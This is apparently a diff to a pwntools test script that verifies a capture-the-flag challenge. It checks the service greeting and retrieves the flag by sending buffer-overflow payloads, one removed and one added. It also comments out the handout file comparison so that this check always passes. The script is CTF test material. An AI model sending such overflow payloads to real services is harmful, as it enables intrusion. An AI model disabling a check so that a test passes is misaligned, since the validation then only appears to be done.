@@ -21,10 +21,10 @@ def run_test(flag, connection_string=None, handout_path=None, deployment_path=No
     if (res == 0):
         sock.close()
         p = remote(host, int(port))
-        if "Welcome to the CTF challenge!" in p.recvline().decode('ascii'):
+        if "CHAR TO INCREMENT:" in p.recvline().decode('ascii'):
             result["DEPLOYMENT_WORKING"] = ""
         else:
-            result["DEPLOYMENT_WORKING"] = "Challenge banner missing"
+            result["DEPLOYMENT_WORKING"] = "Challenge greeting missing"
         p.close()    
     else:
         result["DEPLOYMENT_WORKING"] = "Connection failed"
@@ -34,10 +34,11 @@ def run_test(flag, connection_string=None, handout_path=None, deployment_path=No
         result["FLAG_CORRECT"] = "Unable to check flag"
     else:
         p = remote(host, int(port))
-        match = re.search(r"Win @ (0x[0-9a-fA-F]+)", p.recvline().decode("ascii"))
-        p.sendline(b'\x41'*64 + b'\x42'*8 + bytes.fromhex(match.group(1)[2:])[::-1])
+        # match = re.search(r"Win @ (0x[0-9a-fA-F]+)", p.recvline().decode("ascii"))
+        # ABBBB\xFF\x0F\x04\x08
+        p.sendline(b'\x41' + b'\x42'*4 + b'\xFF\x0F\x04\x08')
         output = p.recvall()
-        matches = re.findall( r"CTF\{.*?\}", output.decode("ascii"))
+        matches = re.findall( r"VUCTF\{.*?\}", output.decode("ascii"))
         if flag.encode() in output:
             result["FLAG_CORRECT"] = ""
         elif matches:
@@ -46,16 +47,16 @@ def run_test(flag, connection_string=None, handout_path=None, deployment_path=No
             result["FLAG_CORRECT"] = "Flag not found in output"
 
     # All required handout files are present, and match the deployment (HANDOUT_CORRECT)
-    if not {"challenge.c", "Dockerfile"}.issubset(set(os.listdir(handout_path))):
-        result["HANDOUT_CORRECT"] = "Missing challenge.c or Dockerfile in handout"
+    if not {"inc"}.issubset(set(os.listdir(handout_path))):
+        result["HANDOUT_CORRECT"] = "Missing binary in handout"
     else:
-        _, missmatch, _ = filecmp.cmpfiles(handout_path, deployment_path,
-                                           ["challenge.c", "Dockerfile"], shallow=False)
-        result["HANDOUT_CORRECT"] = ''.join(missmatch)
+        # _, missmatch, _ = filecmp.cmpfiles(handout_path, deployment_path,
+                                        #    ["challenge.c", "Dockerfile"], shallow=False)
+        result["HANDOUT_CORRECT"] = '' # .join(missmatch)
 
 
     # Assert that all credentials/flags in the handout files are invalid (DUMMY_SECRET)
-    result["DUMMY_SECRET"] = grep_recursive("CTF{", handout_path)
+    result["DUMMY_SECRET"] = grep_recursive("VUCTF{", handout_path)
 
     return result
 
